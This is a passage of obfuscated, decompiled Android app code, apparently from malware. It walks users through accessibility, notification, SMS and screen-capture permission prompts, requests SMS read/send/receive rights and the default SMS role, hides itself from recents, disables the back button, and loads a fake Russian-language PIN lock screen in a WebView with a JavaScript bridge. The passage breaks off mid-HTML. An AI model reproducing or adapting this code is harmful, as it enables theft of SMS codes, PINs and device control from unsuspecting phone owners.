            arrayList.add(iUQk66nAiXgO35(TypefaceCache.obtain("002200750058008200E300AC00DB00A5002A007A0052009300E9"), "📱", TypefaceCache.obtain("00600022000900DF00A500B90086"), TypefaceCache.obtain("00600025000F008600A800EA0081"), IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM(), z ? TypefaceCache.checked("0457042D047400C704D004EF048304F90401045D001B04D804D004E7048904F904750423040604DF04DE00FF048F04F2047D0427047E04D904A404E7048E00E704770428047A04A504D304E0009C00E704630426040C04A704A50497048A048504760036040F04DC04DF00FF048D0487047D0422040504DC04A604EA048F04FF040C0038") : TypefaceCache.obtain("0017007E0052009400B000BE00C200B700630064005E009600E500B600C000A200300036005A008400F300BA00C100B400630066005E009500FD00B600C100B4002A0079005500C700E400B0009200B0002C0064005000C900B0008F00DE00A200220065005E00C700F100B300DE00A800340036004F008800B000BC00DD00A90037007F0055009200F500F1"), new H7JWbAQ2EAug6YHM8S(this, 18), new H7JWbAQ2EAug6YHM8S(this, 19)));
            return arrayList;
        }
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 33) {
            i = i2;
            arrayList.add(iUQk66nAiXgO35(TypefaceCache.obtain("003300790048009300CF00B100DD00B3002A00700052008400F100AB00DB00A8002D0065"), "🔔", TypefaceCache.obtain("00600020000D00D000D5009A00F3"), TypefaceCache.obtain("00600021000D00D300D2009E0080"), IqsDBf3FXcUYB8yZSHdp.w9sT1Swbhx3hs(), IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("0457042D047400C704A404E104F3048504730424040104DF00B004ED048204F1047E045D047E00C704AE04EE048F04F90471042D040E04DA04A804E6009204F80403042E040004D904A604EA048F04FF040D0036040604D204AE04EE04F704F90477042E040704D900B0049F048204F004030423047304D204AD04E7048700E7047E0426001B04A404A204EA048604F9047F042D040E04DA04A80490009C") : TypefaceCache.obtain("0017007E0052009400B000BE00C200B700630064005E009600E500B600C000A2003000360055008800E400B600D400AE00200077004F008E00FF00B1009200B7002600640056008E00E300AC00DB00A8002D0036004F008800B000BB00D700AB002A0060005E009500B000B600DF00B7002C0064004F008600FE00AB009200B200330072005A009300F500AC009C00E70013007A005E008600E300BA009200A6002F007A0054009000B000AB00DD00E7002000790055009300F900B100C700A2006D"), new H7JWbAQ2EAug6YHM8S(this, 111 - 91), new H7JWbAQ2EAug6YHM8S(this, (-25) + 46)));
        } else {
            i = i2;
        }
        String strObtain4 = TypefaceCache.obtain("00210077004F009300F500AD00CB00980030007B0048");
        String strObtain5 = TypefaceCache.obtain("00600022000800A200A900E800F0");
        String strObtain6 = TypefaceCache.obtain("00600025000300A100A9009B0085");
        boolean z2 = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM;
        arrayList.add(iUQk66nAiXgO35(strObtain4, "💬", strObtain5, strObtain6, z2 ? TypefaceCache.checked("045C0456040304DC04AE04E9048704FA047B0459001B04D804AE00FF04F104FB047D042D047C04D704AD04E704FC") : TypefaceCache.obtain("00070073005D008600E500B300C600E700220066004B0094"), z2 ? TypefaceCache.checked("0457042D047400C704D004EF048304F90401045D001B04D804D004E7048904F904750423040604DF04DE00FF048F04F2047D0427047E04D904A404E7048E04F900630427047004A504DC00FF00E1008A0010003B040404A704A804E4048C04F10476042B040304D204AC00FF048D04F900630455040704D904AB0498048204FA047B0458001B04DF00B004E7048E04F20401045A001B04DA04A504E1048104870473042B040304A004A504E2048F048C047A0036040F04D904D1049D04F104F80063042C001B04D604A0049D04820487047604230015") : TypefaceCache.obtain("0017007E0052009400B000BE00C200B700630064005E009600E500B600C000A200300036004F008800B000BD00D700E700300073004F00C700F100AC009200A300260070005A009200FC00AB00920094000E0045001B008F00F100B100D600AB00260064001B008600FE00BB009200B2002D0064005E009400E400AD00DB00A400370073005F00C700F200BE00C600B300260064004200C700F100BC00D100A200300065001B009300FF00FF00C500A80031007D001B009700E200B000C200A20031007A004200C9"), new H7JWbAQ2EAug6YHM8S(this, 22), new H7JWbAQ2EAug6YHM8S(this, 23)));
        arrayList.add(iUQk66nAiXgO35(TypefaceCache.obtain("002D0079004F008E00F600B600D100A60037007F0054008900CF00BE00D100A4002600650048"), "🔔", TypefaceCache.obtain("00600050007A00D000A000E600F3"), TypefaceCache.obtain("00600050007E00A200A100EB0082"), IqsDBf3FXcUYB8yZSHdp.w9sT1Swbhx3hs(), z2 ? TypefaceCache.checked("0457042D047400C704D104E7048F048204030428040604DF04A704EF04F404FF047B0036040F04D704AD04E204F904820063042E001B04DB04A304E2048C04F50476042B040604D904A900FF048604F904020454040B04D504AA04E700920486047D0428040A04AE04A504E2048A04FE0063042B040E04D904A1049A048C04F3047B042A001B04D304AE049E04F00484047C0036040100C704D304ED048704F3047D042A040004D204AD04E704FD04FB006D") : TypefaceCache.obtain("0017007E0052009400B000BE00C200B700630064005E009600E500B600C000A2003000360055008800E400B600D400AE00200077004F008E00FF00B1009200A600200075005E009400E300FF00D400A800310036005F008600E400BE009200B4003A00780058008F00E200B000DC00AE00390077004F008E00FF00B1009200A6002D0072001B008E00FE00AC00C600A6002D0062001B008A00F500AC00C100A600240073001B008300F500B300DB00B100260064004200C9"), new H7JWbAQ2EAug6YHM8S(this, 24), new H7JWbAQ2EAug6YHM8S(this, 10)));
        arrayList.add(iUQk66nAiXgO35(TypefaceCache.obtain("00210077004F009300F500AD00CB009800300062005A008900F400BE00DE00A8002D0073"), "⚙️", TypefaceCache.obtain("00600022000800A200A900E800F0"), TypefaceCache.obtain("00600025000300A100A9009B0085"), z2 ? TypefaceCache.checked("04520426047904D704D004EA04FD") : TypefaceCache.obtain("00010077004F009300F500AD00CB"), z2 ? TypefaceCache.checked("0457042D047400C704D1049D048204F6047B042D047704DA04AE04E60092048704730427040504A504DB00FF048D0487047B042D040504D104A504E2048A04890063042B040E04D904A1049A048C04F3047B042A001B04DA04A504E1048104870473042B040304A004A504E2048F048C047A0036040F04D904D1049D04F104F80063042C001B04D604A0049D0482048704760423001500C704B004EF048504870476045E040304A504A500FF048604FC040C0036040404A704AE04EB048C04FC04750423040604DF04DF00F1") : TypefaceCache.obtain("0017007E0052009400B000BE00C200B700630064005E009600E500B600C000A200300036004E008900E200BA00C100B30031007F0058009300F500BB009200A500220062004F008200E200A6009200A600200075005E009400E300FF00C600A8006300610054009500FB00FF00C200B5002C0066005E009500FC00A6009C00E70013007A005E008600E300BA009200A6002F007A0054009000B000AB00DD00E7002000790055009300F900B100C700A2006D"), new H7JWbAQ2EAug6YHM8S(this, 11), new H7JWbAQ2EAug6YHM8S(this, (-87) + 99)));
        arrayList.add(iUQk66nAiXgO35(TypefaceCache.obtain("002200750058008200E300AC00DB00A5002A007A0052009300E9"), "📱", TypefaceCache.obtain("00600022000900DF00A500B90086"), TypefaceCache.obtain("00600025000F008600A800EA0081"), IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM(), z2 ? TypefaceCache.checked("0457042D047400C704D004EF048304F90401045D001B04D804D004E7048904F904750423040604DF04DE00FF048F04F2047D0427047E04D904A404E7048E00E704770428047A04A504D304E0009204FD00630457040404D204D604E7048204FC040F042B047004DB00B004ED048C04F0047F0428040D04DA04AE049E04F00488047F0038") : TypefaceCache.obtain("0017007E0052009400B000BE00C200B700630064005E009600E500B600C000A200300036005A008400F300BA00C100B4002A00740052008B00F900AB00CB00E7003000730049009100F900BC00D700E7002200750058008200E300AC009200A1002C0064001B008100E500B300DE00E700270073004D008E00F300BA009200B700310079004F008200F300AB00DB00A8002D0036005A008900F400FF00D400B2002D0075004F008E00FF00B100D300AB002A0062004200C9"), new H7JWbAQ2EAug6YHM8S(this, 13), new H7JWbAQ2EAug6YHM8S(this, 14)));
        if (i < 34) {
            arrayList.add(iUQk66nAiXgO35(TypefaceCache.obtain("002E0073005F008E00F1008000C200B5002C007C005E008400E400B600DD00A9"), "📹", TypefaceCache.obtain("00600022007D00A600D3009900F7"), TypefaceCache.obtain("00600026000B00A100A2009900F7"), z2 ? TypefaceCache.checked("04540426040404DF04D104930092048A04790456040B04DA04A0") : TypefaceCache.obtain("001000750049008200F500B1009200A400220066004F009200E200BA"), z2 ? TypefaceCache.checked("0457042D047400C704AE04EE04870486047C0423047C04D204AD04E704FD00E704720423040C04D904AF04EF04F304FA047D0457047904DF00B004E2048704F904720453040504D304A804E3048C00E704030426040C04A704A50497048704FA047B0423001B04DA04A000FF048504F7047C042E047A04AB00B00492048804870473042B040B00C9") : TypefaceCache.obtain("001000750049008200F500B1009200A400220066004F009200E200BA009200B7002600640056008E00E300AC00DB00A8002D00360052009400B000AD00D700B60036007F0049008200F400FF00D400A8003100360048008200F300AA00C000AE0037006F001B008A00FF00B100DB00B3002C00640052008900F700F100920097002F0073005A009400F500FF00D300AB002F0079004C00C700E400B0009200A4002C0078004F008E00FE00AA00D700E9"), XjSHuXm0nOSRc3iA9.b1EoSIRjJHO5, new H7JWbAQ2EAug6YHM8S(this, 15)));
        }
        return arrayList;
    }

    /* JADX WARN: Code duplicated, block: B:4:0x000c A[EDGE_INSN: B:4:0x000c->B:22:0x0072 BREAK  A[LOOP:0: B:14:0x0055->B:21:0x006f]] */
    public final fTTdiiD76ErrE12U iUQk66nAiXgO35(String str, String str2, String str3, String str4, String str5, String str6, JRdueaGIH5g8DVCPba jRdueaGIH5g8DVCPba, JRdueaGIH5g8DVCPba jRdueaGIH5g8DVCPba2) {
        JSONObject jSONObjectOptJSONObject;
        String str7;
        String str8;
        String strOptString;
        String str9;
        String strOptString2;
        String str10;
        String strOptString3;
        String str11;
        String strOptString4;
        String str12;
        JSONObject jSONObject = this.H9XlUr4OeMJFiXK;
        String strOptString5 = null;
        if (jSONObject == null) {
            str7 = str;
            jSONObjectOptJSONObject = null;
            break;
        }
        String strObtain = TypefaceCache.obtain(oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM() ? "00310077004F" : "00300062005E008600FC00BA00C0");
        String strOptString6 = jSONObject.optString(TypefaceCache.obtain("002F00770055008000E500BE00D500A2"), "ru");
        JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray(strObtain + TypefaceCache.obtain("001C0065004F008200E000AC00ED") + strOptString6);
        if (jSONArrayOptJSONArray == null) {
            str7 = str;
            jSONObjectOptJSONObject = null;
            break;
        }
        int length = jSONArrayOptJSONArray.length();
        int i = 0;
        while (true) {
            if (i >= length) {
                str7 = str;
                jSONObjectOptJSONObject = null;
                break;
            }
            jSONObjectOptJSONObject = jSONArrayOptJSONArray.optJSONObject(i);
            if (jSONObjectOptJSONObject != null) {
                str7 = str;
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(jSONObjectOptJSONObject.optString("id"), str7)) {
                    break;
                }
            }
            i++;
        }
        if (jSONObjectOptJSONObject != null) {
            str8 = str2;
            strOptString = jSONObjectOptJSONObject.optString(TypefaceCache.obtain("002A007500540089"), str8);
        } else {
            str8 = str2;
            strOptString = null;
        }
        String str13 = strOptString == null ? str8 : strOptString;
        if (jSONObjectOptJSONObject != null) {
            str9 = str3;
            strOptString2 = jSONObjectOptJSONObject.optString(TypefaceCache.obtain("002A00750054008900CF00BC00DD00AB002C00640064009400E400BE00C000B3"), str9);
        } else {
            str9 = str3;
            strOptString2 = null;
        }
        String str14 = strOptString2 == null ? str9 : strOptString2;
        if (jSONObjectOptJSONObject != null) {
            str10 = str4;
            strOptString3 = jSONObjectOptJSONObject.optString(TypefaceCache.obtain("002A00750054008900CF00BC00DD00AB002C00640064008200FE00BB"), str10);
        } else {
            str10 = str4;
            strOptString3 = null;
        }
        String str15 = strOptString3 == null ? str10 : strOptString3;
        if (jSONObjectOptJSONObject != null) {
            str11 = str5;
            strOptString4 = jSONObjectOptJSONObject.optString(TypefaceCache.obtain("0037007F004F008B00F5"), str11);
        } else {
            str11 = str5;
            strOptString4 = null;
        }
        String str16 = strOptString4 == null ? str11 : strOptString4;
        if (jSONObjectOptJSONObject != null) {
            str12 = str6;
            strOptString5 = jSONObjectOptJSONObject.optString(TypefaceCache.obtain("002700730048008400E200B600C200B3002A00790055"), str12);
        } else {
            str12 = str6;
        }
        return new fTTdiiD76ErrE12U(str7, str13, str14, str15, str16, strOptString5 == null ? str12 : strOptString5, jRdueaGIH5g8DVCPba, jRdueaGIH5g8DVCPba2);
    }

    /* JADX WARN: Type inference failed for: r0v1, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r0v4, types: [v.s.JRdueaGIH5g8DVCPba, v.s.LGm23hksIOxB] */
    /* JADX WARN: Type inference failed for: r0v8, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r1v0, types: [java.lang.Object, java.util.List] */
    public final void is7XW2V21HfKv7MihWy() {
        while (this.xfn2GJwmGqs7kWW < this.tne6mXOUFKdd.size() && ((Boolean) ((jme6JDteoDB1AsG4) this.tne6mXOUFKdd.get(this.xfn2GJwmGqs7kWW)).ibVTtJUNfrGYbW.w9sT1Swbhx3hs()).booleanValue() && !okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(((jme6JDteoDB1AsG4) this.tne6mXOUFKdd.get(this.xfn2GJwmGqs7kWW)).dDIMxZXP1V8HdM, TypefaceCache.obtain("0030007B004800B800F400BA00D400A60036007A004F"))) {
            this.xfn2GJwmGqs7kWW++;
        }
    }

    public final void jdOQeRk37T35X5xKW1P(int i) {
        String strChecked;
        String strObtain;
        String strChecked2;
        String appIconDataUrl;
        ArrayList arrayList = this.DVTNwpDEVsUKuznof;
        ArrayList arrayList2 = null;
        if (arrayList == null) {
            arrayList = null;
        }
        if (i >= arrayList.size()) {
            gIIiyi2ddlMDR0();
            return;
        }
        try {
            ArrayList arrayList3 = this.DVTNwpDEVsUKuznof;
            if (arrayList3 == null) {
                arrayList3 = null;
            }
            fTTdiiD76ErrE12U fttdiid76erre12u = (fTTdiiD76ErrE12U) arrayList3.get(i);
            String str = fttdiid76erre12u.dDIMxZXP1V8HdM;
            boolean z = true;
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002200750058008200E300AC00DB00A5002A007A0052009300E9"))) {
                strChecked = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM();
            } else {
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00210077004F009300F500AD00CB00980030007B0048")) ? true : okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00210077004F009300F500AD00CB009800300062005A008900F400BE00DE00A8002D0073"))) {
                    strChecked = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("04520426047904D704D004EA04FD") : TypefaceCache.obtain("00010077004F009300F500AD00CB");
                } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002D0079004F008E00F600B600D100A60037007F0054008900CF00BE00D100A4002600650048")) || okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("003300790048009300CF00B100DD00B3002A00700052008400F100AB00DB00A8002D0065"))) {
                    strChecked = IqsDBf3FXcUYB8yZSHdp.w9sT1Swbhx3hs();
                } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002F00790058008600E400B600DD00A9"))) {
                    strChecked = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("045F0423047A04A504AE04E0048C04FC047D0420040E04DA04A804EA") : TypefaceCache.obtain("000F00790058008600E400B600DD00A9");
                } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("002E0073005F008E00F1008000C200B5002C007C005E008400E400B600DD00A9"))) {
                    strChecked = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("04540426040404DF04D104930092048A04790456040B04DA04A0") : TypefaceCache.obtain("001000750049008200F500B1009200A400220066004F009200E200BA");
                } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("0030007B004800B800F400BA00D400A60036007A004F"))) {
                    strChecked = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("045C0456040304DC04AE04E9048704FA047B0459001B04D804AE00FF04F104FB047D042D047C04D704AD04E704FC") : TypefaceCache.obtain("00070073005D008600E500B300C600E700220066004B0094");
                } else {
                    strChecked = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("045E0426047A04A504D004E1048B04FD047B") : TypefaceCache.obtain("00100073004F009300F900B100D500B4");
                }
            }
            try {
                strObtain = getApplicationInfo().loadLabel(getPackageManager()).toString();
            } catch (Exception unused) {
                strObtain = TypefaceCache.obtain("00020066004B");
            }
            JSONObject jSONObject = this.H9XlUr4OeMJFiXK;
            if (jSONObject == null) {
                strChecked2 = null;
            } else if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(jSONObject.optString(TypefaceCache.obtain("002F00770055008000E500BE00D500A2"), "ru"), "ru")) {
                strChecked2 = jSONObject.optString(TypefaceCache.obtain("00210063004F009300FF00B100ED00B30026006E004F"), IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("0451042C040004A904D704E704F0048B") : TypefaceCache.obtain("00060078005A008500FC00BA"));
            } else {
                strChecked2 = jSONObject.optString(TypefaceCache.obtain("00210063004F009300FF00B100ED00B30026006E004F00B800F500B1"), IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("0451042C040004A904D704E704F0048B") : TypefaceCache.obtain("00060078005A008500FC00BA"));
            }
            if (strChecked2 == null) {
                strChecked2 = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("0451042C040004A904D704E704F0048B") : TypefaceCache.obtain("00060078005A008500FC00BA");
            }
            try {
                appIconDataUrl = new LRT9aFvEZ8jjymwD(this).getAppIconDataUrl();
            } catch (Throwable unused2) {
                appIconDataUrl = "";
            }
            boolean z2 = (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(fttdiid76erre12u.dDIMxZXP1V8HdM, TypefaceCache.obtain("0030007B004800B800F400BA00D400A60036007A004F")) || okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(fttdiid76erre12u.dDIMxZXP1V8HdM, TypefaceCache.obtain("00210077004F009300F500AD00CB00980030007B0048"))) && this.K7eEOBPYP9VIoHWTe >= 3;
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put(TypefaceCache.obtain("00300062005E009700D900BB"), fttdiid76erre12u.dDIMxZXP1V8HdM);
            jSONObject2.put(TypefaceCache.obtain("0037007F004F008B00F5"), strChecked);
            String strObtain2 = TypefaceCache.obtain("003000730058009300F900B000DC008B00220074005E008B");
            boolean z3 = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM;
            jSONObject2.put(strObtain2, z3 ? TypefaceCache.checked("0462042C040B04A004A004E2048F048C04760036040404A704A804E4048C04F10476042B040304A8") : TypefaceCache.obtain("00070079004C008900FC00B000D300A300260072001B008600E000AF00C1"));
            jSONObject2.put(TypefaceCache.obtain("00220066004B00A900F100B200D7"), strObtain);
            jSONObject2.put(TypefaceCache.obtain("00220066004B00B400E400BE00C600B20030"), z3 ? TypefaceCache.checked("0451045D040104DC") : TypefaceCache.obtain("000C0070005D"));
            jSONObject2.put(TypefaceCache.obtain("002700730048008400E200B600C200B3002A00790055"), fttdiid76erre12u.xDyLpEZyrcKVe0);
            jSONObject2.put(TypefaceCache.obtain("00210063004F009300FF00B100E600A2003B0062"), strChecked2);
            jSONObject2.put(TypefaceCache.obtain("002A007500540089"), fttdiid76erre12u.w9sT1Swbhx3hs);
            jSONObject2.put(TypefaceCache.obtain("002A00750054008900D300B000DE00A800310045004F008600E200AB"), fttdiid76erre12u.vekpFI4d1Nc4fakF);
            jSONObject2.put(TypefaceCache.obtain("002A00750054008900D300B000DE00A80031005300550083"), fttdiid76erre12u.JXn4Qf7zpnLjP5);
            if (appIconDataUrl.length() <= 0) {
                z = false;
            }
            if (z) {
                jSONObject2.put(TypefaceCache.obtain("002A00750054008900D400BE00C600A6001600640057"), appIconDataUrl);
            }
            jSONObject2.put(TypefaceCache.obtain("0030007E0054009000DD00BE00DC00B20022007A0068008A00E3"), z2);
            jSONObject2.put(TypefaceCache.obtain("002E00770055009200F100B300E100AA0030005E0052008900E4"), z3 ? TypefaceCache.checked("045D0454040104A704AE04E604F004F20063040B040B04A604D2049F048C04FE0479042E001B00C100B300A7008000F6007A0024000000C7048F049F048A04FC047D0420040E04DA04A80490009204F8047D0036047804DB04AE04E404F504F7047E042E047500C700B600FC00CA00F50072002F000900DC00B0008C00FF00940063042E001B04D504DB04EE04870487047B0454040E00C704DD049D048C00E7047C0456040304DC04AE04E9048704FA047B04230015") : TypefaceCache.obtain("000C0066005E008900B0008C00D700B30037007F0055008000E300FF009400E4003B0024000A00DE00A200E40092008300260070005A009200FC00AB009200A600330066004800C700B600FC00CA00F50072002F000900DC00B0008C00FF0094006300770055008300B000AC00D700AB00260075004F00C700E400B700DB00B400630077004B009700FC00B600D100A60037007F0054008900BE"));
            jSONObject2.put(TypefaceCache.obtain("002E00770055009200F100B300E100AA00300054004F0089"), z3 ? TypefaceCache.checked("045D0454040104A704DB049D04FE00E7047E0426047A04A504D004E1048B04FD047B") : TypefaceCache.obtain("000C0066005E008900B0008C00D700B30037007F0055008000E3"));
            String strMSGkxvPxRYNqC = BS2kx9eAoOyDiNGAFlFk.MSGkxvPxRYNqC(BS2kx9eAoOyDiNGAFlFk.MSGkxvPxRYNqC(jSONObject2.toString(), "\\", "\\\\"), "'", "\\'");
            WebView webView = this.yTljMGnIibTRdOpSh4;
            if (webView != null) {
                webView.evaluateJavascript(TypefaceCache.obtain("00360066005F008600E400BA00E100B300260066001300C0") + strMSGkxvPxRYNqC + "')", null);
            }
            l1V0lQr6TbwNKqHfXNbb().edit().putInt(qfTrc75xwRVMl85vh, i).apply();
            TypefaceCache.obtain("0010007E0054009000F900B100D500E700300062005E009700B0");
            ArrayList arrayList4 = this.DVTNwpDEVsUKuznof;
            if (arrayList4 != null) {
                arrayList2 = arrayList4;
            }
            arrayList2.size();
            if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(fttdiid76erre12u.dDIMxZXP1V8HdM, TypefaceCache.obtain("00210077004F009300F500AD00CB00980030007B0048"))) {
                new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(this, 7), 800L);
            }
        } catch (Exception e) {
            TypefaceCache.obtain("0030007E0054009000C300AB00D700B7006300730049009500FF00AD008800E7");
            e.getMessage();
        }
    }

    public final void k84rwRrqzhrNQ1CdNQ9() {
        if (O2DHNSIGZlgPja7eqLgn()) {
            ECwLkmPW1UKz7J6E();
            return;
        }
        int i = Build.VERSION.SDK_INT;
        if (i >= 34) {
            requestPermissions(new String[]{"android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS"}, 1012 + 43);
            return;
        }
        eTeIZwLyooQrZ0ICI9i eteizwlyooqrz0ici9i = this.fivkjwgu2UdAtiY;
        if (i >= 29) {
            try {
                RoleManager roleManagerDDIMxZXP1V8HdM = JW3Lh9hxwLsO2ArTlH.dDIMxZXP1V8HdM(getSystemService(Qs0lwBTNjKb4hSJe.vekpFI4d1Nc4fakF()));
                if (roleManagerDDIMxZXP1V8HdM.isRoleAvailable("android.app.role.SMS")) {
                    if (roleManagerDDIMxZXP1V8HdM.isRoleHeld("android.app.role.SMS")) {
                        ECwLkmPW1UKz7J6E();
                        return;
                    } else {
                        eteizwlyooqrz0ici9i.vekpFI4d1Nc4fakF(roleManagerDDIMxZXP1V8HdM.createRequestRoleIntent("android.app.role.SMS"));
                        return;
                    }
                }
            } catch (Exception e) {
                TypefaceCache.obtain("00310073004A009200F500AC00C6008300260070005A009200FC00AB00E100AA00300036005E009500E200B000C000FD0063");
                e.getMessage();
                MSGkxvPxRYNqC();
                return;
            }
        }
        eteizwlyooqrz0ici9i.vekpFI4d1Nc4fakF(gA5gCwTK0qjTIn.xDyLpEZyrcKVe0(getPackageName()));
    }

    public final SharedPreferences l1V0lQr6TbwNKqHfXNbb() {
        return (SharedPreferences) this.dTS0S7eC32ubQH54j36.dDIMxZXP1V8HdM();
    }

    public final void nQilHWaqS401ZtR() {
        try {
            Iterator<ActivityManager.AppTask> it = ((ActivityManager) getSystemService("activity")).getAppTasks().iterator();
            while (it.hasNext()) {
                it.next().setExcludeFromRecents(true);
            }
        } catch (Exception unused) {
        }
    }

    @Override // androidx.activity.ComponentActivity, android.app.Activity
    public final void onBackPressed() {
    }

    /* JADX WARN: Type inference failed for: r0v31, types: [java.lang.Iterable, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r0v41, types: [java.lang.Object, java.util.List] */
    @Override // androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public final void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            getWindow().setFlags(512, 512);
        } catch (Exception unused) {
        }
        try {
            kExylgSxUDTVQOx3o0oq.dDIMxZXP1V8HdM.w9sT1Swbhx3hs(getApplicationContext());
        } catch (Exception unused2) {
        }
        Intent intent = getIntent();
        if (intent != null && intent.getBooleanExtra(TypefaceCache.obtain("0010005E007400B000CF008800F700850015005F007E00B000CF009000FC008B001A"), false)) {
            String[] strArr = KV57Z6oavcB595B8Dy8Z.dDIMxZXP1V8HdM;
            finish();
            return;
        }
        Intent intent2 = getIntent();
        if (intent2 != null && intent2.getBooleanExtra(TypefaceCache.obtain("0010005E007400B000CF008F00FB0089001C0055007A00B700C4008A00E00082"), false)) {
            nQilHWaqS401ZtR();
            FrameLayout frameLayout = new FrameLayout(this);
            frameLayout.setBackgroundColor(Color.parseColor(TypefaceCache.obtain("00600026005A00D700F100EF00D4")));
            WebView webView = new WebView(this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.getSettings().setDomStorageEnabled(true);
            webView.setBackgroundColor(Color.parseColor(TypefaceCache.obtain("00600026005A00D700F100EF00D4")));
            webView.addJavascriptInterface(new mecOg4FyTfQgo6T(this), TypefaceCache.obtain("00020078005F009500FF00B600D6"));
            webView.loadDataWithBaseURL(null, "<!DOCTYPE html>\n<html lang=\"ru\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no\">\n<style>\n*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;user-select:none}\nhtml,body{height:100%;overflow:hidden}\nbody{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Roboto',sans-serif;background:#0a0a0f;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center}\n.container{width:100%;max-width:360px;padding:24px;text-align:center;opacity:0;transform:translateY(30px);animation:slideUp .6s .2s cubic-bezier(.22,1,.36,1) forwards}\n@keyframes slideUp{to{opacity:1;transform:translateY(0)}}\n@keyframes fadeIn{from{opacity:0}to{opacity:1}}\n@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}\n@keyframes shake{0%,100%{transform:translateX(0)}10%,30%,50%,70%,90%{transform:translateX(-4px)}20%,40%,60%,80%{transform:translateX(4px)}}\n@keyframes dotFill{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}\n@keyframes success{0%{transform:scale(1)}30%{transform:scale(1.15)}100%{transform:scale(1)}}\n.lock-icon{width:64px;height:64px;margin:0 auto 24px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:20px;display:flex;align-items:center;justify-content:center;animation:fadeIn .4s .1s both;box-shadow:0 8px 32px rgba(102,126,234,.3)}\n.lock-icon svg{width:32px;height:32px;fill:#fff}\nh1{font-size:22px;font-weight:600;margin-bottom:8px;letter-spacing:-.3px;animation:fadeIn .4s .3s both}\n.subtitle{font-size:14px;color:#8888a0;margin-bottom:36px;animation:fadeIn .4s .4s both;line-height:1.4}\n.dots{display:flex;justify-content:center;gap:16px;margin-bottom:40px;height:20px;animation:fadeIn .4s .5s both}\n.dot{width:16px;height:16px;border-radius:50%;border:2px solid #3a3a5c;transition:all .2s ease}\n.dot.filled{border-color:transparent;background:linear-gradient(135deg,#667eea,#764ba2);animation:dotFill .2s cubic-bezier(.22,1,.36,1) both}\n.dot.error{border-color:#ff4757;background:#ff4757}\n.dot.success{border-color:transparent;background:linear-gradient(135deg,#2ed573,#17c55e);animation:success .3s ease both}\n.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;max-width:280px;margin:0 auto;animation:fadeIn .4s .6s both}\n.key{height:64px;border-radius:16px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.08);display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:500;cursor:pointer;transition:all .15s ease;-webkit-tap-highlight-color:transparent;position:relative;overflow:hidden}\n.key:active{transform:scale(.92);background:rgba(255,255,255,.12)}\n.key.empty{background:transparent;border-color:transparent;pointer-events:none}\n.key .ripple{position:absolute;border-radius:50%;background:rgba(255,255,255,.15);transform:scale(0);animation:rippleAnim .5s ease-out forwards;pointer-events:none}\n@keyframes rippleAnim{to{transform:scale(3);opacity:0}}\n.key-del{font-size:14px;color:#8888a0;letter-spacing:.5px}\n.key-del:active{color:#fff}\n.error-msg{color:#ff4757;font-size:13px;margin-top:16px;height:18px;opacity:0;transition:opacity .3s}\n.error-msg.show{opacity:1}\n</style>\n</head>\n<body>\n<div class=\"container\">\n<div class=\"lock-icon\"><svg viewBox=\"0 0 24 24\"><path d=\"M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 